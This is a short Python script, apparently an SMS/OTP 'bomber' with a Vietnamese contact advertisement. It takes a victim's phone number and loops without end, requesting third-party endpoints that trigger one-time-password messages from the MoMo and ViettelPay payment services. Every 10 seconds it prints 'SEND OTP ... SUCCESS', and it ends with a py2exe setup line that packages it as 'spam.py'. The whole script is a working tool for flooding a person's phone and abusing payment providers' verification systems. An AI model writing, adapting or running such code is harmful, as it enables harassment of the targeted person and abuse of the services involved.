import requests, time
print ("Liên hệ zalo 0375001297 - anh biên đẹp trai")
from time import sleep
phone = input("Input Phone: ")
while True:
   main = requests.get("https://danganhduy.io/login-momo.php?phone="+str(phone)).json()
   if main == 0:
       print ("Liên hệ zalo 0375001297 - anh biên đẹp trai")
       sleep(5)
       break
   else:
       main2 = requests.get("https://danganhduy.io/login-vtpay.php?phone="+str(phone))
       print ("SEND OTP MOMO SUCCESS: "+phone)
       print ("SEND OTP VTPAY SUCCESS: "+phone)
       sleep(10)
from distutils.core import setup

import py2exe

setup(console=['spam.py'])